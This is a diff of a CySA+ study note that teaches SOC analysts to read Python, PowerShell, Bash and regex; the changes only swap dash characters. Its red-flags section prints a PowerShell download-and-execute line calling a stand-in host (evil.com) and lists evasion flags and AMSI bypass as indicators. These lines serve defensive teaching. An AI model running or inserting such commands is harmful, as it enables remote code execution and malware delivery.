@@ -1,22 +1,22 @@
 # Scripting Languages for Analysts
 
-CySA+ explicitly lists scripting languages as a core SOC analyst skill. Expect questions where a snippet of code or regex is shown and you have to identify what it does or which output it produces. You don't need to write production-grade code; you need **literacy** — read it, understand intent, recognize obvious indicators.
+CySA+ explicitly lists scripting languages as a core SOC analyst skill. Expect questions where a snippet of code or regex is shown and you have to identify what it does or which output it produces. You don't need to write production-grade code; you need **literacy** - read it, understand intent, recognize obvious indicators.
 
 ## When SOC analysts script
 
-- **Parsing logs** — extract specific fields from millions of lines.
-- **Enriching alerts** — call APIs (VirusTotal, Shodan, internal CMDB) and add context.
-- **Bulk lookups** — check 500 IPs against a threat feed.
-- **Automating triage** — repetitive playbook steps.
-- **Custom detections** — when the SIEM rule language can't express what you need.
-- **Forensics** — quickly carve, hash, timeline.
+- **Parsing logs** - extract specific fields from millions of lines.
+- **Enriching alerts** - call APIs (VirusTotal, Shodan, internal CMDB) and add context.
+- **Bulk lookups** - check 500 IPs against a threat feed.
+- **Automating triage** - repetitive playbook steps.
+- **Custom detections** - when the SIEM rule language can't express what you need.
+- **Forensics** - quickly carve, hash, timeline.
 
 ## Python
 
 The de facto language for security automation. Readable, huge ecosystem, runs on everything.
 
 ### Why analysts use it
-- Clean syntax — easy to read others' code.
+- Clean syntax - easy to read others' code.
 - Standard libraries: `re` (regex), `json`, `csv`, `datetime`, `subprocess`, `hashlib`.
 - Security-specific libs: **requests** (HTTP), **scapy** (packet crafting), **pwntools** (exploit dev), **pefile** / **yara-python** (malware), **paramiko** (SSH).
 - API clients for nearly every vendor.
@@ -53,13 +53,13 @@ print(r.json()['data']['attributes']['last_analysis_stats'])
 ### Exam-relevant constructs
 - `for ... in ...` loops over a sequence.
 - `if ... elif ... else`.
-- `with open(...) as f:` — file handling.
+- `with open(...) as f:` - file handling.
 - List comprehensions: `[x for x in items if condition]`.
 - `import re`, `re.search`, `re.findall`.
 
 ## PowerShell
 
-Microsoft's scripting language. **Default for Windows admin and forensics.** Also an attacker favorite (T1059.001 in MITRE ATT&CK) — analysts must read it both for benign and malicious use.
+Microsoft's scripting language. **Default for Windows admin and forensics.** Also an attacker favorite (T1059.001 in MITRE ATT&CK) - analysts must read it both for benign and malicious use.
 
 ### Why analysts use it
 - Native to Windows; no install.
@@ -91,24 +91,24 @@ Get-ScheduledTask | Where-Object { $_.State -eq 'Ready' } |
 Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4625} -MaxEvents 50
 ```
 
-### Malicious PowerShell — red flags
-- **`-EncodedCommand`** (or `-enc`, `-e`) — base64-encoded payload to evade detection.
+### Malicious PowerShell - red flags
+- **`-EncodedCommand`** (or `-enc`, `-e`) - base64-encoded payload to evade detection.
 - **`IEX`** (Invoke-Expression) downloading and executing remote scripts:
   ```powershell
   IEX (New-Object Net.WebClient).DownloadString('http://evil.com/x.ps1')
   ```
-- **`-ExecutionPolicy Bypass`** — sidesteps default policy.
-- **`-WindowStyle Hidden`** — runs invisibly.
-- **`-NoProfile -NonInteractive`** — common in implants.
-- **AMSI bypass strings** — attempts to disable Antimalware Scan Interface.
+- **`-ExecutionPolicy Bypass`** - sidesteps default policy.
+- **`-WindowStyle Hidden`** - runs invisibly.
+- **`-NoProfile -NonInteractive`** - common in implants.
+- **AMSI bypass strings** - attempts to disable Antimalware Scan Interface.
 - **Reflective DLL loading**, **Add-Type** with C# inline source.
 
 These flags appearing together is a strong indicator of malicious activity. SIEM/EDR rules detect them.
 
 ### PowerShell logging (analyst angle)
-- **Module logging** — records pipeline execution.
-- **Script block logging** — records actual code that executed (decodes encoded commands). Event ID **4104**.
-- **Transcription** — full session log to file.
+- **Module logging** - records pipeline execution.
+- **Script block logging** - records actual code that executed (decodes encoded commands). Event ID **4104**.
+- **Transcription** - full session log to file.
 - Enable all three in Group Policy for high-fidelity PowerShell visibility.
 
 ## Bash
@@ -144,48 +144,48 @@ sha256sum suspicious.bin
 
 ### Pipelines
 The `|` (pipe) chains commands; output of one becomes input of next. Recognize common patterns:
-- `cat file | grep X | wc -l` — count lines matching X.
-- `cmd | sort | uniq -c | sort -rn | head` — frequency-rank a list.
-- `grep -v` — *exclude* matches.
+- `cat file | grep X | wc -l` - count lines matching X.
+- `cmd | sort | uniq -c | sort -rn | head` - frequency-rank a list.
+- `grep -v` - *exclude* matches.
 
 ### Common Linux commands an analyst should read
-- `ps aux` — process list.
-- `netstat -tulpn` / `ss -tulpn` — listening ports.
-- `lsof -i` — open network sockets.
-- `last`, `lastlog`, `w` — login activity.
-- `journalctl -u <service>` — service logs (systemd).
-- `find / -name X 2>/dev/null` — locate files.
-- `iptables -L`, `nft list ruleset` — firewall rules.
+- `ps aux` - process list.
+- `netstat -tulpn` / `ss -tulpn` - listening ports.
+- `lsof -i` - open network sockets.
+- `last`, `lastlog`, `w` - login activity.
+- `journalctl -u <service>` - service logs (systemd).
+- `find / -name X 2>/dev/null` - locate files.
+- `iptables -L`, `nft list ruleset` - firewall rules.
 
 ## Regex (Regular Expressions)
 
-Pattern matching language. Universal — used in Python, PowerShell, Bash, SIEM queries, EDR detections, IDS rules.
+Pattern matching language. Universal - used in Python, PowerShell, Bash, SIEM queries, EDR detections, IDS rules.
 
 ### Anchors
-- `^` — start of line / string.
-- `$` — end of line / string.
-- `\b` — word boundary.
+- `^` - start of line / string.
+- `$` - end of line / string.
+- `\b` - word boundary.
 
 ### Character classes
-- `\d` — digit (0-9).
-- `\w` — word character (letters, digits, underscore).
-- `\s` — whitespace.
-- `.` — any character (except newline by default).
-- `[abc]` — one of a, b, or c.
-- `[^abc]` — *not* a, b, or c.
-- `[a-z]`, `[A-Z]`, `[0-9]` — ranges.
+- `\d` - digit (0-9).
+- `\w` - word character (letters, digits, underscore).
+- `\s` - whitespace.
+- `.` - any character (except newline by default).
+- `[abc]` - one of a, b, or c.
+- `[^abc]` - *not* a, b, or c.
+- `[a-z]`, `[A-Z]`, `[0-9]` - ranges.
 
 ### Quantifiers
-- `*` — zero or more.
-- `+` — one or more.
-- `?` — zero or one (also makes greedy → lazy).
-- `{n}` — exactly n.
-- `{n,m}` — n to m.
+- `*` - zero or more.
+- `+` - one or more.
+- `?` - zero or one (also makes greedy → lazy).
+- `{n}` - exactly n.
+- `{n,m}` - n to m.
 
 ### Grouping & alternation
-- `(...)` — capture group.
-- `(?:...)` — non-capturing group.
-- `a|b` — a or b.
+- `(...)` - capture group.
+- `(?:...)` - non-capturing group.
+- `a|b` - a or b.
 
 ### Useful patterns to recognize
 
@@ -220,7 +220,7 @@ https?://[^\s<>"]+
 ```
 
 ### Exam-style question pattern
-"Given regex `<pattern>`, which input matches?" — read left-to-right, mentally apply each construct. The traps usually involve:
+"Given regex `<pattern>`, which input matches?" - read left-to-right, mentally apply each construct. The traps usually involve:
 - Greedy vs lazy quantifiers.
 - Anchor presence (`^...$` vs unanchored).
 - Character class subtleties (`\d` vs `[0-9]`, `\.` vs `.`).
@@ -228,7 +228,7 @@ https?://[^\s<>"]+
 
 ## Other you may see
 
-- **YARA rules** — pattern matching for files (malware classification). Looks like:
+- **YARA rules** - pattern matching for files (malware classification). Looks like:
   ```
   rule SuspiciousString {
       strings:
@@ -238,10 +238,10 @@ https?://[^\s<>"]+
           $a or $b
   }
   ```
-- **Sigma** — SIEM-agnostic detection rule format (YAML).
-- **Snort/Suricata rules** — IDS signatures (text-based pattern + action).
-- **KQL** (Kusto Query Language) — Microsoft Sentinel, Defender XDR, Azure Log Analytics.
-- **SPL** (Search Processing Language) — Splunk.
+- **Sigma** - SIEM-agnostic detection rule format (YAML).
+- **Snort/Suricata rules** - IDS signatures (text-based pattern + action).
+- **KQL** (Kusto Query Language) - Microsoft Sentinel, Defender XDR, Azure Log Analytics.
+- **SPL** (Search Processing Language) - Splunk.
 
 You don't need to write these for CySA+ but should recognize what they are.
 
@@ -252,23 +252,23 @@ You don't need to write these for CySA+ but should recognize what they are.
 - Be able to **match a regex to expected input** (or rule out non-matches).
 - Know which language is **native to which OS** (PowerShell = Windows, Bash = Linux).
 - Know **PowerShell event ID 4104** = script block logging (decoded malicious scripts show up here).
-- Understand that scripting is used for **both attack and defense** — same `IEX` syntax in a benign sysadmin script and an attacker dropper.
+- Understand that scripting is used for **both attack and defense** - same `IEX` syntax in a benign sysadmin script and an attacker dropper.
 
 ---
 
-← Back: [01_14 Threat Hunting](01_14_threat_hunting.md) — Next: [01_16 Process & Automation](01_16_process_and_automation.md) →
+← Back: [01_14 Threat Hunting](01_14_threat_hunting.md) - Next: [01_16 Process & Automation](01_16_process_and_automation.md) →
 
 ## Related
 
 **Internal:**
-- [01_09 Logs and monitoring](01_09_logs_and_monitoring.md) — scripts often parse these
-- [01_12 File and malware analysis](01_12_file_and_malware_analysis.md) — hashing, strings, automation
-- [01_14 Threat hunting](01_14_threat_hunting.md) — custom hunt queries
-- [01_16 Process and automation](01_16_process_and_automation.md) — SOAR layers automation on top
+- [01_09 Logs and monitoring](01_09_logs_and_monitoring.md) - scripts often parse these
+- [01_12 File and malware analysis](01_12_file_and_malware_analysis.md) - hashing, strings, automation
+- [01_14 Threat hunting](01_14_threat_hunting.md) - custom hunt queries
+- [01_16 Process and automation](01_16_process_and_automation.md) - SOAR layers automation on top
 
 **External:**
 - [PowerShell documentation](https://learn.microsoft.com/en-us/powershell/)
 - [Python documentation](https://docs.python.org/3/)
 - [Bash reference manual (GNU)](https://www.gnu.org/software/bash/manual/)
-- [regex101 — interactive regex tester](https://regex101.com/)
+- [regex101 - interactive regex tester](https://regex101.com/)
 - [Sigma (detection-rule format)](https://github.com/SigmaHQ/sigma)
